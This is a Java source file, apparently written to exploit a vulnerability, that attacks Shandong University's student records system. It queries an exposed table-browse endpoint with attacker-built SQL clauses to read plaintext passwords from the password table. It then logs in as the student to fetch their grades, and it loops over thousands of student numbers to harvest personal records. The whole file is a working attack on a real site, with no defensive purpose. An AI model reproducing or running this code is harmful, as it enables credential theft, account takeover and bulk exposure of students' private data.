package edu_vul_use;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.*;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;

import org.htmlparser.visitors.TextExtractingVisitor;
import org.htmlparser.Parser;




public class client {
	public static String request(String url) {
		StringBuffer bs = new StringBuffer();
		try {
			URL url_need = new URL(url);
			URLConnection urlcon;
			urlcon = url_need.openConnection();
			InputStream is = urlcon.getInputStream();
			BufferedReader buffer = new BufferedReader(
					new InputStreamReader(is));
			String l = null;
			while ((l = buffer.readLine()) != null) {
				bs.append(l).append("/n");
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return bs.toString();

	}

	public static String grade(String sno)

	{
		String textInPage = "";
		int statusCode = 0;
		HttpClient httpclient = new HttpClient();
		PostMethod postMethod = new PostMethod(
				"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bks_login2.login");
		String password = client.re_password(client.request(client
				.get_url_1(sno)));
		password = password.substring(0, password.length() - 1);
		NameValuePair[] data = { new NameValuePair("stuid", sno),
				new NameValuePair("pwd", password) };
		postMethod.setRequestBody(data);
		try {
			statusCode = httpclient.executeMethod(postMethod);
			if (statusCode == HttpStatus.SC_OK) {
			} else if (statusCode == HttpStatus.SC_MOVED_PERMANENTLY
					|| statusCode == HttpStatus.SC_MOVED_TEMPORARILY) {
				Header locationHeader = postMethod
						.getResponseHeader("Set-Cookie");
				String cookie = null;
				if (locationHeader != null) {
					cookie = locationHeader.getValue();
					int s = cookie.indexOf("=");
					int e = cookie.indexOf(";");
					cookie = cookie.substring(s + 1, e);
					System.out.println(cookie);

					GetMethod f = new GetMethod(
							"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bks_login2.loginmessage");
					statusCode = httpclient.executeMethod(f);
					if (statusCode == HttpStatus.SC_OK) {
						System.out.println("µÇÂ¼³É¹¦");

					} else {
						System.out.println("µÇÂ¼Ê§°Ü");
						System.exit(0);
					}
					f = new GetMethod(
							"http://jwxt.sdu.edu.cn:7890/pls/wwwbks/bkscjcx.curscopre");
					statusCode = httpclient.executeMethod(f);
					if (statusCode == HttpStatus.SC_OK) {
						String grade = f.getResponseBodyAsString();

						String ENCODE = "GBK";
						Parser parser = Parser.createParser(grade, ENCODE);
						TextExtractingVisitor visitor = new TextExtractingVisitor();
						parser.visitAllNodesWith(visitor);
						textInPage = visitor.getExtractedText();
						textInPage.split("\r");
						int a = textInPage.indexOf("¿Î³ÌÊôÐÔ");
						textInPage = textInPage.substring(a + 4);

					}

				} else {
					System.err.println("cookie value is null.");
				}
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return textInPage;
	}

	public static ArrayList<String> re_info(String s)// regular match html to
	{
		ArrayList<String> info_list = new ArrayList<String>();
		String temp = "";
		Pattern pattern = Pattern
				.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
		Matcher matcher = pattern.matcher(s);
		if (matcher.find()) {
			temp = matcher.group(0);
			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
			matcher = pattern.matcher(temp);
			temp = matcher.replaceAll("?");
			pattern = Pattern.compile("</TD>/n");
			matcher = pattern.matcher(temp);
			temp = matcher.replaceAll(" ");
		}

		while (temp.indexOf("?") >= 0) {
			int start = temp.indexOf("?");
			temp = temp.substring(start + 1);
			int end = temp.indexOf("?");
			try {
				String content = temp.substring(0, end);
				if (!content.equals(" ")) {
					info_list.add(content);
				}
			} catch (Exception e) {
				// ½áÊø
			}
		}
		return info_list;
	}

	public static String re_password(String s)// regular match html to get
	{
		String temp = "";
		Pattern pattern = Pattern
				.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
		Matcher matcher = pattern.matcher(s);
		if (matcher.find()) {
			temp = matcher.group(0);
			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
			matcher = pattern.matcher(temp);
			temp = matcher.replaceAll("?");
			pattern = Pattern.compile("</TD>/n");
			matcher = pattern.matcher(temp);
			temp = matcher.replaceAll(" ");
		}
		temp = temp.substring(1);
		int start = temp.indexOf("?");
		temp = temp.substring(start + 1);
		int end = temp.indexOf("?");
		String pass = temp.substring(0, end);
		return pass;
	}
	
	public static void makelist() {
		long s = 201200131000l;
//		long s_z = 201205130000l;
//		long s_g = 201208130000l;
		for (int i = 1; i <= 9999; i++) {
			s = s + 1;
			String sno = Long.toString(s);
			String info = "";
			try {
				ArrayList<String> list = client.re_info(client.request(client
						.get_url_2(sno)));
				if (list.isEmpty())
					;
				else {
					Iterator<String> it = list.iterator();
					for (int j = 0; j <= 1; j++) {
						if (it.hasNext())

							info = info + it.next();
					}
					info += "\n";
					System.out.println(info);
				}
			} catch (Exception e) {
				System.out.println("exception!!!!	" + sno);

			}

		}

	}

	public static String get_url_1(String sno)// get password url
	{
		String url = "";
		url = "http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XK_MMB&ccolumns=*&cclauses=where%20xh%20=%27"
				+ sno + "%27&nrow_min=1&nrow_max=150";
		return url;
	}

	public static String get_url_2(String sno)// get info url
	{
		String url = "";
		url = "http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XJ_XJB&ccolumns=*&cclauses=where%20xh%20=%27"
				+ sno + "%27&nrow_min=1&nrow_max=150";
		return url;
	}

	public static void main(String[] args) {
		// makelist();

	}

}
